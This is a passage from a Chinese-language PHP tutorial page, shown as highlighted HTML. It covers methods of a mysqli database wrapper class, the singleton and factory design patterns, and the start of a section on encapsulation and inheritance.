class="line"><span class="comment"># 执行SQL错误检查</span></span><br><span class="line"><span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;check(<span class="variable">$sql</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 读取记录列数</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;columns = @mysqli_field_count(<span class="keyword">$this</span>-&gt;link);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判定结果，进行加工：成功读取一条记录，失败返回错误信息</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span> ? mysqli_fetch_assoc(<span class="variable">$res</span>) : <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>12、读取操作：读取多条记录：可能需要知道总的记录数以及查询结果的列数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 属性：记录查询结果的行数</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$rows</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读操作</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read_all</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="comment"># 执行SQL错误检查</span></span><br><span class="line"><span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;check(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判定结果，进行加工</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$res</span>) <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 记录结果数量</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;rows = mysqli_num_rows(<span class="variable">$res</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据需求解析数据</span></span><br><span class="line"><span class="variable">$list</span> = [];</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysqli_fetch_assoc(<span class="variable">$res</span>)) <span class="variable">$list</span>[] = <span class="variable">$row</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回结果</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$list</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>13、用户在使用Sql类的时候，必须要进行第一步实例化、然后连接认证和实现字符集设置。这样的话用户操作比较麻烦，应该是用户实例化Sql类就可以直接进行相应的业务处理：所以可以将连接认证、字符集设置在初始化方法中实现（构造方法）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$info</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">    <span class="comment"># 初始化：确保用户传入了数据，否则使用默认值</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;host = <span class="variable">$info</span>[<span class="string">&#x27;host&#x27;</span>] ?? <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;port = <span class="variable">$info</span>[<span class="string">&#x27;port&#x27;</span>] ?? <span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;user = <span class="variable">$info</span>[<span class="string">&#x27;user&#x27;</span>] ?? <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;pass = <span class="variable">$info</span>[<span class="string">&#x27;pass&#x27;</span>] ?? <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;dbname = <span class="variable">$info</span>[<span class="string">&#x27;dbname&#x27;</span>] ?? <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;charset = <span class="variable">$info</span>[<span class="string">&#x27;charset&#x27;</span>] ?? <span class="string">&#x27;utf8&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 调用初始化和字符集设置</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;connect()) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;charset();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>14、确定类的控制：不需要外部访问的私有，需要外部访问的公有，重要的数据私有并增加公有操作方法进行安全控制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数据库初始化资源私有：不需要外部访问</span></span><br><span class="line"><span class="keyword">private</span> <span class="variable">$host</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$port</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$user</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$pass</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$dbname</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$charset</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接资源仅限内部使用</span></span><br><span class="line"><span class="keyword">private</span> <span class="variable">$link</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接认证和字符集设置已经内部调用，不需要外部使用</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">charset</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># SQL检查属于内部调用，不需要公有</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>14、测试：利用数据库类实现数据库的写操作和读操作</p><blockquote><p><strong>小结</strong></p></blockquote><p>1、类的封装是以功能驱动为前提，相关操作存放到一个类中</p><p>2、一个类通常是一个独立的文件，文件名与类名相同（方便后期维护和自动加载）</p><p>3、类中如果有数据需要管理，设定属性</p><p>4、类中如果有功能需要实现（数据加工），设定方法</p><p>5、一个功能通常使用一个方法实现，方法的颗粒度应该尽可能小（方便复用）</p><p>6、应该尽可能增加类对成员的控制：即能私有尽可能私有</p><p>7、类中需要实现的功能应该由具体的业务来实现支撑</p><ul><li>实用类：只考虑当前业务，不考虑全面性（代码少，应用范围小）</li><li>工具类：全面综合考虑，尽可能多的封装可能存在的业务（代码多，应用范围广）</li></ul><hr><h1 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a><strong>设计模式</strong></h1><blockquote><p><strong>定义</strong>：设计模式（Design pattern） 是软件开发人员在软件开发过程中面临的一般问题的解决方案。这些解决方案是众多软件开发人员经过相当长的一段时间的试验和错误总结出来的。 设计模式有很多，在PHP中通常只用两种设计模式</p></blockquote><ul><li>单例模式</li><li>工厂模式</li></ul><blockquote><p><strong>思考</strong>：有这么一种需求，希望一个类有且仅有一个对象，这样可以保证对象的完整性，请问该如何实现呢？</p></blockquote><blockquote><p><strong>引入</strong>：我们将这种一个类最多只有一个对象称之为单例，在操作系统中这种方式需求很多，如资源管理器。而通过代码实现这种单例的设计思路，我们称之为<code>单例模式</code>。</p></blockquote><h2 id="1-单例模式【掌握】"><a href="#1-单例模式【掌握】" class="headerlink" title="1. 单例模式【掌握】"></a><strong>1. 单例模式【掌握】</strong></h2><blockquote><p><strong>定义</strong>：单例模式singleton，是一种类的设计只会最多产生一个对象的设计思想。</p></blockquote><ol><li>首先定义一个空类，叫做Singleton</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//创建一个空类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>思考：对象的产生是通过实例化产生的，而实例化是一种不可控行为，即可以产生无限多个对象，所以应该禁止：即”禁止实例化“，之所以是引号，是因为只能禁止在类外部实例化对象，私有化构造方法</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在上述类中增加私有化构造方法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//尝试外部实例化</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Singleton();<span class="comment">//致命错误：不能访问私有方法</span></span><br></pre></td></tr></table></figure><ol start="3"><li>思考：一旦外部不能实例化对象了，那就意味着根本“不可能”产生对象了，此时就只能想办法在还没有产生对象的时候就进入到“类内部”，意味着只能通过<code>静态方法</code>让类直接进入到类的内部</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在上述类中增加公有静态方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>思考：进入类的内部依然还是没有对象，此时需要在静态方法内部进行对象实例化，并且把得到的对象返回到外部</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改公有静态方法：获取对象，并返回给外部调用出</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">self</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//外部获取对象</span></span><br><span class="line"><span class="variable">$s</span> = Singleton::getInstance();</span><br></pre></td></tr></table></figure><ol start="5"><li>思考：此方法开启了实例化对象的窗口，但是此时新问题出现：无限调用静态方法依然可以得到多个对象。如果想要该方法只返回一个对象，就得保证类内部有办法存着某个产生的对象，第一次产生新的，后面返回旧的。此时需要使用静态属性</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//增加静态属性：私有，不允许外部修改，否则外部修改之后就没有意义了</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$object</span> = <span class="literal">NULL</span>;<span class="comment">//初始化为NULL，没有对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改静态方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//判断内部属性是否存在对象（is_object函数）：最好的判定是存的对象是当前类的 instanceof</span></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="built_in">self</span>::<span class="variable">$object</span> <span class="keyword">instanceof</span> <span class="built_in">self</span>))&#123;</span><br><span class="line">        <span class="comment">//当前保存的内容不是当前类的对象</span></span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$object</span> = <span class="keyword">new</span> <span class="built_in">self</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//返回对象给外部</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$object</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="6"><li>此时可以保证外部无论多少次调用公有静态方法获取实例，都会只得到一个对象。但是此时外部对象依然可以产生新的对象：因为克隆，所以还必须禁止对象的克隆，即在类内部私有化克隆方法</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在Singleton类中增加私有化的__clone()方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>总结</strong></p></blockquote><ol><li>单例模式就是设计的类最多只能得到一个对象</li><li>单例模式的设计规范就是“三私一公”</li></ol><ul><li>私有化构造方法：禁止在类外无限实例化对象</li><li>私有化克隆方法：禁止对象无限克隆对象</li><li>私有化静态属性：保存类内部实例化得到的对象</li><li>公有化静态方法：允许外部通过调用类内部方法获取对象</li></ul><ol start="3"><li>单例模式如果还有其他功能诉求，可以在类中增加相应的其他类成员</li><li>单例模式的目的是为了保护资源的唯一性</li></ol><hr><blockquote><p><strong>思考</strong>：一个类可能在多个地方需要实例化，如数据库类，每次操作数据库都要实例化，如果类名改了，那是不是有很多地方代码要改？</p></blockquote><blockquote><p><strong>引入</strong>：因为类在实例化对象的时候是new 类名实现，所以如果出现类名的修改，那么所有的new操作的确都需要重新修改代码。如果有一种方式，可以在某个地方实现所有的实例化，那么修改就会变得简单，这个就需要用到<code>工厂模式</code>。</p></blockquote><h2 id="2-工厂模式【掌握】"><a href="#2-工厂模式【掌握】" class="headerlink" title="2. 工厂模式【掌握】"></a><strong>2. 工厂模式【掌握】</strong></h2><blockquote><p><strong>定义</strong>：工厂模式factory，是指像工厂一样流水线生产对象，由一个地方生产对象，其他位置就不需要额外实例化对象，从而可以方便后期代码统一的维护。而且工厂模式下可以方便隐藏真实的类结构，因此也更加安全。</p></blockquote><ol><li>工厂模式针对的是“相同模型”的统一产出，即使用工厂模式产出对象对应的类都有相同的结构或者功能。所以，首先要有一批具有类似功能的类（其实本质是同样的大类下的小类）</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//三个类文件</span></span><br><span class="line"><span class="comment">//人是一种大类，人下应该有男人、女人、人妖，各自成类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;这是男人&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;这是女人&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ladyboy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;这是人妖&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>以前访问这些类的话都需要通过new 类名来实现，多出使用就多次new。如果使用工厂模式的话，就需要增加一个工厂类：HumanFactory</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//人类工厂</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HumanFactory</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="variable">$classname</span>();<span class="comment">//可变变量使用</span></span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="variable">$hf</span> = <span class="keyword">new</span> HumanFactory();</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$hf</span>-&gt;getInstance(<span class="string">&#x27;Man&#x27;</span>);</span><br><span class="line"><span class="variable">$m</span>-&gt;display();<span class="comment">//这是男人</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$w</span> = <span class="variable">$hf</span>-&gt;getInstance(<span class="string">&#x27;Woman&#x27;</span>);</span><br><span class="line"><span class="variable">$w</span>-&gt;display();<span class="comment">//这是女人</span></span><br></pre></td></tr></table></figure><ol start="3"><li>上述工厂类在对象生产的时候，额外产生了一个工厂类的对象，该对象无实际含义，因此可以使用更优的方式来生产对象：静态工厂</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//静态人类工厂</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HumanFactory</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="variable">$classname</span>();<span class="comment">//可变变量使用</span></span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="variable">$m</span> = HumanFactory::getInstance(<span class="string">&#x27;Man&#x27;</span>);</span><br><span class="line"><span class="variable">$m</span>-&gt;display();<span class="comment">//这是男人</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$w</span> = HumanFactory::getInstance(<span class="string">&#x27;Woman&#x27;</span>);</span><br><span class="line"><span class="variable">$w</span>-&gt;display();<span class="comment">//这是女人</span></span><br></pre></td></tr></table></figure><ol start="4"><li>以上模式虽然也是工厂生产对象，但是是建立在使用者知道类名的前提下，而且如果原类名修改，依然需要多处修改代码，所以没有达到工厂模式的真实目的。修改工厂模式</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//静态人类工厂</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HumanFactory</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"><span class="variable">$flag</span></span>)</span>&#123;<span class="comment">//flag只是一种标志：不是类名</span></span><br><span class="line">        <span class="comment">//$flag可以是m代表Man，w代表Woman，L代表Ladyboy</span></span><br><span class="line">        <span class="keyword">switch</span>(<span class="variable">$flag</span>)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Man();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Woman();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Ladyboy();</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;<span class="comment">//匹配失败，返回空</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="variable">$m</span> = HumanFactory::getInstance(<span class="string">&#x27;m&#x27;</span>);</span><br><span class="line"><span class="variable">$m</span>-&gt;display();<span class="comment">//这是男人</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$w</span> = HumanFactory::getInstance(<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="variable">$w</span>-&gt;display();<span class="comment">//这是女人</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>总结</strong></p></blockquote><ol><li>工厂模式是一种按需生产对象的模式</li><li>工厂模式通常是需要在大型项目中，会出现很多的相同功能的类，此时可以使用工厂产生对象</li><li>工厂模式的优点是能够方便后期对类的维护（更名）</li><li>工厂模式的缺点是随着功能增加，会需要增加很多开发量（开发多个工厂）</li></ol><h1 id="面向对象高级"><a href="#面向对象高级" class="headerlink" title="面向对象高级"></a><strong>面向对象高级</strong></h1><blockquote><p><strong>思考</strong>：面向对象也就是把函数和变量常量之类的多用了一层类包裹，然后多了个对象访问而已嘛，似乎也不像面向对象思想说的那样好啊？</p></blockquote><blockquote><p><strong>引入</strong>：类和对象是面向对象的基础部分，是将基本思想使用代码方式设计简单实现。面向对象还有很多高级的部分，更能够体现面向对象思想编程的强大。</p></blockquote><ul><li>面向对象三大特性</li><li>PHP继承</li><li>抽象类</li><li>接口</li><li>对象遍历</li></ul><blockquote><p><strong>总结</strong>：面向对象核心的思想在于符合人类的思维逻辑，同时能够方便后期维护开发，实现代码的重复利用。这些都将在高级里面体现。</p></blockquote><hr><h2 id="一、-面向对象三大特性"><a href="#一、-面向对象三大特性" class="headerlink" title="一、 面向对象三大特性"></a><strong>一、 面向对象三大特性</strong></h2><blockquote><p><strong>引入</strong>：在面向对象思想中，有三大特性：<code>封装</code>、<code>继承</code>和<code>多态</code>。</p></blockquote><blockquote><p><strong>思考</strong>：我们在使用类和对象来实现编程的时候，到底是遵循着什么样的逻辑呢？为什么要这样去规范类呢？</p></blockquote><blockquote><p><strong>引入</strong>：面向对象很重要的思想就是隐藏，即外部不知道类内部是如何实现业务逻辑的，只管调用和使用结果，这个就是面向对象的三大特性之一：<code>封装</code></p></blockquote><h3 id="1-封装【掌握】"><a href="#1-封装【掌握】" class="headerlink" title="1. 封装【掌握】"></a><strong>1. 封装【掌握】</strong></h3><blockquote><p><strong>定义</strong>：封装，字面意思就是将内容装到某个容器中，并进行密封保存。在面向对象思想中，封装指将<code>数据</code>和对<code>数据的操作</code>捆绑到一起，形成对外界的隐蔽，同时对外提供可以操作的<code>接口</code>。</p></blockquote><ol><li>数据：即要操作的数据，在面向对象的具体体现就是类成员属性（属性和静态属性）和类常量，这些都是在类的内部定义的用来保存数据的</li><li>数据的操作：即数据加工过程，在面向对象的具体体现就是方法，内部定义业务逻辑对数据进行加工处理。</li><li>捆绑到一起：即使用类结构{}将属性、类常量和方法存放到一起，成为一个整体</li><li>对外提供可操作的接口：即提供可以供外部访问的类成员（通常是方法）</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//封装特性</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;<span class="comment">//捆绑内容到一起，形成对外界隐蔽的整体</span></span><br><span class="line">    <span class="keyword">const</span> ALLOW = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$count</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$money</span> = <span class="number">0</span>; <span class="comment">//数据：属性和类常量保存</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getMoney</span>(<span class="params"></span>)</span>&#123;<span class="comment">//数据操作</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;money;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//外部</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s</span>-&gt;getMoney();<span class="comment">//外部只能访问类中公有的方法，具体实现不可见</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>总结</strong></p></blockquote><ol><li>封装是从对象抽象形成类的过程</li><li>封装是一种将数据和数据操作捆绑到一起，形成对外部的隐蔽，同时提供对外操作的接口</li><li>封装是面向对象第一大特性，也是面试官喜欢询问对面向对象思想理解的知识</li></ol><hr><blockquote><p><strong>思考</strong>：面向对象思想是符合人类的思维逻辑的，那现实中的“富二代”之类的能够在面向对象思维里体现吗？</p></blockquote><blockquote><p><strong>引入</strong>：面向对象最核心的一部分就是代码的重复利用的问题，而“富二代”的本质就是前人栽树后人乘凉的问题，所以面向对象的第二大特性就是<code>继承</code></p></blockquote><h3 id="2-继承【掌握】"><a href="#2-继承【掌握】" class="headerlink" title="2. 继承【掌握】"></a><strong>2. 继承【掌握】</strong></h3><blockquote><p><strong>定义</strong>：继承，即有些类似的对象中，如人是一种大类，下面可以细分出一些小类，如男人、女人等，然后有一些公共的特性可以在一些基础类中体现，而其他相似或者较小类可以直接使用上级类中的公共代码。</p></blockquote><ol><li>继承的基础：子类（要继承其他类的类，也称之为派生类）与父类（被继承类，也称之为基类）之间本身是一种包含于被包含关系，如此才有可继承的前提</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//大类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;&#125;<span class="comment">//人类</span></span><br><span class="line"><span class="comment">//小类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span></span>&#123;&#125;<span class="comment">//属于人类包含的部分，可以继承Human</span></span><br></pre></td></tr></table></figure><ol start="2"><li>继承关键字：extends，子类想要继承父类，则必须在子类结构申明时明确使用extends关键字来继承相关类</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span 